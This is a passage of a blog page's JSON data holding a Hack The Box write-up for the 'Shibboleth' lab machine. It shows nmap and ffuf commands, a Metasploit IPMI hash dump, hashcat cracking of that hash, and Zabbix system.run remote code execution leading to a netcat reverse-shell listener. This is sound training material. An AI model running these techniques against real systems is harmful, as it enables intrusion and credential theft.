{
    "componentChunkName": "component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx",
    "path": "/shibboleth",
    "result": {"data":{"post":{"slug":"/shibboleth","title":"Shibboleth","date":"24.03.2021","tags":[{"name":"HTB Writeup","slug":"htb-writeup"}],"description":null,"canonicalUrl":null,"body":"var _excluded = [\"components\"];\n\nfunction _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsxRuntime classic */\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Shibboleth\",\n  \"date\": \"2021-03-24T00:00:00.000Z\",\n  \"tags\": [\"HTB Writeup\"]\n};\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, _excluded);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"75.83333333333333%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACvUlEQVQ4y3WTS2/cVBiGs4EF0Ll57Iztscf2udoz48tkQtuIDbsKCXGRQEVdFEFXlSq1TUMbtWmDQFCFDQs2CPhHLFmx4ac8yJ4OBCUsXvk7x995znc7O0PfcJkGE83IN7zpGV4bKiaRxosKnKhikjb4YsUobXCzhkA0OHGNGy3YuQjT52CaXEuefLLk+c0ly/mcXtQQyoaRWDEUewzEil2xwksbRnF9ETiYmA3MNSys4uiL9/jo8Us+eHLGozvvU1YVo3TNQK3p6316ep+x3MNrL0iayyN0gk2adz+suXl4wpe/nXH7p1M+vX/Mw8/eZpIsSPKK2JREekmiFiRyjpPW/w98fSi5+/GaF9/e54+fD/j9ueTZV59zeOuALJMscsvcGAolyZXEKoWbXprypn5veYaysPz66F3+/PE6f50qfrl3wDtXK5S2FHmOlIZopohnCin0RWAL2357ruCNsaQuJD/cLvjuVsG6KfHTOUpp4rTA9RWJrFBCo6XGTarLI3TCnKy4SpCVOHHDKFoyTQsG0wZlG5qqQqgFWWbR0mKlwrQRRmUL1PwrQ8+ThKLmxTdn3Hv4lJOvX/Ls9HtOnh7z+OiQo6Njjg8fkBuLVRojJDqVpDPFdJaz047Jf6UZTgxBVhNmDbHa6zTT+5TVmrLcQ5kKmVlEojvNYs0sMWhlNxGOY437SuNXGk0lTiS7iKsbAeWNgCuuxE8kQmuKuWXeapFjckssTDcdHXAUGIZBm7Lq7G7tKwa+pO8p1LUUfS2l52n6bWkCzTg0uNPWV23OBpsX1jVlsNs2osCLl53d/vDTmkitCcWKgVdwxTGEWUkkys633/m1pVl1b7g917I6YH9XMUmWRGrVwdp1mNXIxfWu205o6U80qTTYfDP423q3fuNp8c/I7Zyfva29vWSrzb7uourvXvQ7z/gb0wK3IicMuvMAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"Shibboleth\",\n    \"title\": \"Shibboleth\",\n    \"src\": \"/Blogs_Writeups/static/46afdd990e85d30dd9e6b649f09eb1b1/7d769/Shibboleth.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/46afdd990e85d30dd9e6b649f09eb1b1/5243c/Shibboleth.png 240w\", \"/Blogs_Writeups/static/46afdd990e85d30dd9e6b649f09eb1b1/ab158/Shibboleth.png 480w\", \"/Blogs_Writeups/static/46afdd990e85d30dd9e6b649f09eb1b1/7d769/Shibboleth.png 960w\", \"/Blogs_Writeups/static/46afdd990e85d30dd9e6b649f09eb1b1/4af54/Shibboleth.png 1400w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"h3\", null, \"Scanning and Enumeration of Open Ports (Using Nmap)\"), mdx(\"h5\", null, \"Nmap\"), mdx(\"p\", null, \"Nmap (or network mapper) is a open source tool for Network exploitation and security analysis. Using Nmap, you can scan\\none or several hosts for different services running on different ports.\\nFor installing and more info on Nmap , use\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-noLineNumbers\"\n  }, \"sudo apt install nmap\\nman nmap\\n\")), mdx(\"h5\", null, \"Service Scanning\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\",\n    \"className\": \"language-noLineNumbers\"\n  }, \"nmap -Pn -sV -sC 10.10.11.124\\n\")), mdx(\"p\", null, \"-sV: Probe open ports to determine service/version info\"), mdx(\"p\", null, \"-sC: equivalent to --script=default\"), mdx(\"p\", null, \"-Pn: Treat all hosts as online -- skip host discovery\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u279C  Shibboleth git:(master) \\u2717 nmap -Pn -sV -sC 10.10.11.124  \\n\\nStarting Nmap 7.60 ( https://nmap.org ) at 2022-03-31 12:25 IST\\nNmap scan report for 10.10.11.124\\nHost is up (0.18s latency).\\nNot shown: 999 closed ports\\nPORT   STATE SERVICE VERSION\\n80/tcp open  http    Apache httpd 2.4.41\\n|_http-server-header: Apache/2.4.41 (Ubuntu)\\n|_http-title: Did not follow redirect to http://shibboleth.htb/\\nService Info: Host: shibboleth.htb\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 38.45 seconds\\n\\n\")), mdx(\"p\", null, \"We can see a Http server running on Port 80\"), mdx(\"h3\", null, \"Checking on port 80:\"), mdx(\"p\", null, \"We got the site url : \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shibboleth.htb\")), mdx(\"p\", null, \"Open \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/etc/hosts\"), \" file and add \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"10.10.11.124    shibboleth.htb\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo nano /etc/hosts\\n\")), mdx(\"p\", null, \"Nothing seems interesting on the website.Lets do a subdomain fuzz using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ffuf\"), \".I used the following \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/danielmiessler/SecLists\"\n  }, \"wordlist.\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb/ -H \\\"Host:http://FUZZ.shibboleth.htb\\\" -mc all -fc 404,400\\n\\n\")), mdx(\"p\", null, \"Yep, found some subdomains \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"zabbix,monitor and monitoring\"), \". All redirected to the same page.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"364px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"121.66666666666669%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAAAsTAAALEwEAmpwYAAAC3UlEQVQ4y62UPY/cVBSG/Sco01CCgIaegiYF1EjZKh8UJEUkQApQBFZCNBT8AGp+AeIjFVJWrJCYBLKTLJvdnRmPF4/nwx5/e+1r3/sge8bjmfWERIgrPbr2ucev33vusTUpFduRDUo1rOJqbW7Q2DaUen5sWw6gKaW4SDmk4xDdvk108xbRRx+T7O4S3/mE6IOb5J3OQrMoWs9qtcAqKOVC0LYJd3YILl8mun5jIX71GsE77yL29laCLYe1WGuH9UuyDJWmC8prIRbxdRNrO1s5LPIcIURFnuf8l7Gx5dnURteH9Ho6/cEQIXJkISnygqJ4HrLt0A9DdMNkOnMolKKQcpMy9gxSkbcFQ89nZJg44xlS5BRCLMhEVY7iPG1IzinStEKep2TnaVXTspU0lgWWIwv16BDZPUI8fop42EU8eYroPEIcniCOe+Tl/V+niJMBuX5GfqojukcUjtvUsBbE80E3oD+sZnWiowYGHPdQPeOFDmRzy2GE43rMXQ8/jFDr7bOlRS62S+uUbduh19cZDAxMa0JWtlDVSkvyf6flME4SzNG4+fTkFjdyu7ts/ZRrq2LpSK1tU9YHVte5/ACkbLlLM9F26CYCazbHNMeMxlPM0QTbcbGscp4zmdqYpoXnh0hVCqsVcu1/sBJM84I4DPDtKYHr4Dsz0igg8hxEHJAEHu7UIkuiFzvlkZvy51nEYyuhO4rpjhIOzJiuGdMZhjwwQg7K2N8RD4c+fxhBxQPd53gcNw5Ly+W49d0h2nvfo12/h3b15yU/od24x6VP7/PSh7+gvb9cu7akzN35gTe//K0t+NWPfS7duc/ru/u8+vmva+zz9jcd3vr6d97Y3eeVu83aa1/s8/Jne1z59uBiDRWikMRZQbIFP8krnrWe5rL5Y/M/Dy2IYkr8knBz9sJN/Hquc8Imt9bRxo5LC3vOxHE5G894cqoztKYc9Q261fWE6dyrcrY9+w/vFxGYvk54OwAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"Login\",\n    \"title\": \"Login\",\n    \"src\": \"/Blogs_Writeups/static/02d6bb62c062d6134e75d211325a8558/fea74/zabbix_login.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/02d6bb62c062d6134e75d211325a8558/5243c/zabbix_login.png 240w\", \"/Blogs_Writeups/static/02d6bb62c062d6134e75d211325a8558/fea74/zabbix_login.png 364w\"],\n    \"sizes\": \"(max-width: 364px) 100vw, 364px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"Open \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/etc/hosts\"), \" file and add \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"10.10.11.124    zabbix.shibboleth.htb\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo nano /etc/hosts\\n\")), mdx(\"p\", null, \"We now need credentials to login to the Shibboleth Database system.\"), mdx(\"p\", null, \"Searched for vulnerabilities in Zabbix Login System, and found a whole of list like Login Bypass by SQL Injection,XSS,CSRF,and RCE... but none of the exploit worked.\"), mdx(\"p\", null, \"Time to take a step back and search if any other port is open or not.\"), mdx(\"h4\", null, \"UDP Port Scan\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u279C  Shibboleth git:(master) \\u2717 nmap -sU -10.10.11.124  \\n\\nStarting Nmap 7.60 ( https://nmap.org ) at 2022-03-31 12:25 IST\\nNmap scan report for 10.10.11.124\\n\\nPORT    STATE SERVICE\\n623/udp open  asf-rmcp\\n\\nNmap done: 1 IP address (1 host up) scanned in 1087.30 seconds\\n\")), mdx(\"p\", null, \"Yep found port 623 open. Searched about asf-rmcp vulnerabilities and found \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/\"\n  }, \"https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/\")), mdx(\"h4\", null, \"BMC and IPMI\"), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Interface (IPMI)\"), \" is a collection of specifications that define communication protocols for talking both across a local bus as well as the network. \"), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Baseboard Management Controllers (BMCs)\"), \" are a type of embedded computer used to provide out-of-band monitoring for desktops and servers.\"), mdx(\"p\", null, \"Used \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Metasploit Framework\"), \" to know more about the version of IPMI used and also to exploit it.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"38.75%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVQoz5WQ/W6EIBDEfZt+nScICLrnCSoa7Ps/zzTs1Utz1yb2jwmwTHb3N4VfFqxhRAoBqw+gwUM0Du+ixodU/1Yxpw00TrCDh716GOpxkupww0dfMcQI2Th+vJQVXkuBt0qy8Yj2pvu90B1B2ha1y+pg6AJpHU61RqkMzrpBqTTrVtP3v1837KcZlbFQHaG59JhSQtw+4eMCCiNsf+WBWTnb/Z6Hn5V5btgNHsq1jF2z2bFZNJYNf+Hv9SfkYY5YOsIoJKisoO1tC2EsYx3J7+dZxG3DuKyY1hUxJZAPjJ6VN5XfA1RLd1zJ6I7zfczxC61xAMDQRATpAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"IPMI_version\",\n    \"title\": \"IPMI_version\",\n    \"src\": \"/Blogs_Writeups/static/b27f397908c76574f70e88ca6d211d7a/7d769/ipmi_version.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/b27f397908c76574f70e88ca6d211d7a/5243c/ipmi_version.png 240w\", \"/Blogs_Writeups/static/b27f397908c76574f70e88ca6d211d7a/ab158/ipmi_version.png 480w\", \"/Blogs_Writeups/static/b27f397908c76574f70e88ca6d211d7a/7d769/ipmi_version.png 960w\", \"/Blogs_Writeups/static/b27f397908c76574f70e88ca6d211d7a/87339/ipmi_version.png 1440w\", \"/Blogs_Writeups/static/b27f397908c76574f70e88ca6d211d7a/0b75d/ipmi_version.png 1838w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Got IPMI Version 2\")), mdx(\"h4\", null, \"IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval\"), mdx(\"p\", null, \"We will use msf \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ipmi_dumphashes\"), \" module for this purpose.Executed successfully and we got password hash for one of the users.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run\\n\\n[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:f6864526820100009a6cd71bb3529d6a06f44fc52d0a21a97d0792f03f078cff1c359fdb06288e05a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:9f84180a4ecbb98bc1e9c0c53f\\n\\n[*] Scanned 1 of 1 hosts (100% complete)\\n[*] Auxiliary module execution completed\\n\\nHASH is IPMI 2.0 RAKP (RMCP ) HMAC-SHA1 \\n\")), mdx(\"p\", null, \"Note: The above hash is not the correct one. I have removed some characters to avoid copying of hashes.\"), mdx(\"h4\", null, \"Hashcat to retrieve password from the hash\"), mdx(\"p\", null, \"I used hashcat and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"rockyou.txt\"), \" to obtain the password from obtained hash.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u279C  Shibolleth git:(master) \\u2717 hashcat -a 0 -m 7300 hash.txt /opt/SecLists/rockyou.txt --force\\n- Device #1: autotuned kernel-loops to 1\\n1a1bffea82050000c454896fcbe7c362583e207fce037776091d6737151558e2d5c0b70b4862a650a123456789abcdefa123456789abcdef140d41646d696\\ne6973747261746f72:323edde62b2c35663eef:**retrieved password here**\\n                                                          \\nSession..........: hashcat\\nStatus...........: Cracked\\nHash.Type........: IPMI2 RAKP HMAC-SHA1\\nHash.Target......: 1a1bffea82050000c454896fcbe7c362583e207fce037776091...663eef\\nTime.Started.....: Fri Apr  1 22:10:33 2022 (5 secs)\\nTime.Estimated...: Fri Apr  1 22:10:38 2022 (0 secs)\\nGuess.Base.......: File (/opt/SecLists/rockyou.txt)\\nGuess.Queue......: 1/1 (100.00%)\\nSpeed.Dev.#1.....:  1439.6 kH/s (5.01ms)\\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\\nProgress.........: 7397376/14344384 (51.57%)\\nRejected.........: 0/7397376 (0.00%)\\nRestore.Point....: 7389184/14344384 (51.51%)\\nCandidates.#1....: ilovetj26 -> ilovemymum55\\nHWMon.Dev.#1.....: N/A\\n\\n\")), mdx(\"p\", null, \"Yeah finally we got the credentials and we successfully logged in to the Shibboleth  Data System.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"50%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB90lEQVQoz22S3UuTURjAX6NErJvob+imQKKgi+jDTTQCKcIuunZQ0SoxugyCEX1AXcQqpIYRgVnIIKnA2VpQGxolY4WK9DGwZN8fDre97znn/cW7zTV1D/x4Hs7F75zzPI/Wdeg0OzsdPHnzkcWlGH/iKZbiSZYSNeLrcuN5jb+xOAvRRQKRKFrbvl60XT34QjNYUTYMhJTohsAQolKvZiGsWiKkoljWSWbzddL5ZfKFAtr2Dhtb9vTyYaoqlLqOKUUdKXRMJVBKIaWJlAplmhVhPJ1dQyyVRWvf3cmmvScJfF+oCAVgrkOxGg2VUhVJIpNbg7bVEu4/hf+GG9zD6E89GGMehN+D/PwYMTsMiYf8Dgd55YXJ92kCX8PMzP8kmcnVX1cX7ug6w+aeASaP90OHjVLfUcqObpSrG/nIjhg/BvMHCI3e59I5uH4ryu1no7x894lUNr9R2GZ30mobxPHazcDsXfoX7uG7OYBp60P0nODLVRdDExM8GPHin57DMExWSmUKK8XmX249cpaWgxe4EhjhTsyLKzHO1Ish1KAL4/I15jzPGZuO4PUHifz4Ve9fWTeaC7d1OdEOO/GFvoEuq1Optf//CKohlaqsjtkw5Q3Cdvt5Wjov8jYYplhYJpPLo1uro1Qda00smSGsHa3eWNKbC/8BCyisoSJ6zwEAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"dashboard\",\n    \"title\": \"dashboard\",\n    \"src\": \"/Blogs_Writeups/static/d1d676fdd6aaa8f3d4a93e3b9c48f4f4/7d769/dashboard.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/d1d676fdd6aaa8f3d4a93e3b9c48f4f4/5243c/dashboard.png 240w\", \"/Blogs_Writeups/static/d1d676fdd6aaa8f3d4a93e3b9c48f4f4/ab158/dashboard.png 480w\", \"/Blogs_Writeups/static/d1d676fdd6aaa8f3d4a93e3b9c48f4f4/7d769/dashboard.png 960w\", \"/Blogs_Writeups/static/d1d676fdd6aaa8f3d4a93e3b9c48f4f4/87339/dashboard.png 1440w\", \"/Blogs_Writeups/static/d1d676fdd6aaa8f3d4a93e3b9c48f4f4/a7a8c/dashboard.png 1859w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"h4\", null, \"Zabbix 5.0 RCE Vulnerability Exploitation (Reverse Shell)\"), mdx(\"p\", null, \"After logging, we have a nice dashboard. Now time to read about Zabbix. So Zabbix is basically an enterprise-class open source distributed monitoring solution. I tried searching reverse shell through Zabbix dashboard.\\nAfter some research about different types of vulnerabilities in different version of Zabbix , I came up here(\", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html\"\n  }, \"https://packetstormsecurity.com/files/166256/Zabbix-5.0.17-Remote-Code-Execution.html\"), \").\"), mdx(\"p\", null, \"So, a native Zabbix agent, developed in C language, may run on various supported platforms, including Linux, UNIX, and Windows, and collect data such as CPU, memory, disk, and network interface usage from a device. Reading the manual and roaming around the dashboard I got the Zabbix agent.\"), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Zabbbix agent\"), \"contains a key field that has an option \\u201Csystem.run\\u201D which is used to execute specified commands on hosts.\"), mdx(\"p\", null, \"Ran the above script .What does this script essentialy do is ,it takes username , password for the zabbix database system and send a reverse shell to the local ip on a specified port.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"8.333333333333332%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAUklEQVQI133MMQ6AIAwFUK5D2wRLhViCLhLvf6NvTFwYdHjrC+0U9EHYrwejD4EfgrQlSFFIXWarghYDa37ZJLA7uDWwF1CpiFYR1UA5gz/8hTf0pz8SDPkMeQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"rce\",\n    \"title\": \"rce\",\n    \"src\": \"/Blogs_Writeups/static/41dece81609af92221f921fb95f9be03/7d769/zabbix_rce.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/41dece81609af92221f921fb95f9be03/5243c/zabbix_rce.png 240w\", \"/Blogs_Writeups/static/41dece81609af92221f921fb95f9be03/ab158/zabbix_rce.png 480w\", \"/Blogs_Writeups/static/41dece81609af92221f921fb95f9be03/7d769/zabbix_rce.png 960w\", \"/Blogs_Writeups/static/41dece81609af92221f921fb95f9be03/87339/zabbix_rce.png 1440w\", \"/Blogs_Writeups/static/41dece81609af92221f921fb95f9be03/0b75d/zabbix_rce.png 1838w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"This script set the key field is \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"items.php\"), \" to system.run($command to exexute$). So we put command of reverse shell and start a listener on the specified port.\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"960px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"41.66666666666667%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABD0lEQVQoz12R226EMAxE+f/f60MfWqmrqhe1u4QQiHNzMpUNG9gijWJH+HjsDGYJ8IlBidFaQ8kFKSWEEEEUwMyoraHWelLrp9ScNeD0yYX3hNto8PN7hbUOIUYtZq7gehJvwHvdAezJBhV3o5lwvY5wboGZLKydMc9O89ktsBIvq0qmOEOHtpPExWQmGNFk1aExFrmUY0wdvT3GOwj/gbKrGCLWvbOdFyyrR8qlj9hPFWujuztg4yiwbbcIRDpeKWVz3ZpC5J/aDjdnHfvHo0M5nXMInvD28Y3X90/dz+oJFFMH5FzgibSp5JQyHKXOGA7L6A/zfPnC08sFMUZ95cLcR5U45awS96kwQubO+AOgzXPJvlnOLAAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"reverse\",\n    \"title\": \"reverse\",\n    \"src\": \"/Blogs_Writeups/static/00a946c53c6967e73541e3395f360890/7d769/rce_query.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/00a946c53c6967e73541e3395f360890/5243c/rce_query.png 240w\", \"/Blogs_Writeups/static/00a946c53c6967e73541e3395f360890/ab158/rce_query.png 480w\", \"/Blogs_Writeups/static/00a946c53c6967e73541e3395f360890/7d769/rce_query.png 960w\", \"/Blogs_Writeups/static/00a946c53c6967e73541e3395f360890/e60c6/rce_query.png 978w\"],\n    \"sizes\": \"(max-width: 960px) 100vw, 960px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"On local machine ,run \"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"nc -nlvp <port number>\\n\")), mdx(\"p\", null, \"And yay! we received the reverse shell.\"), 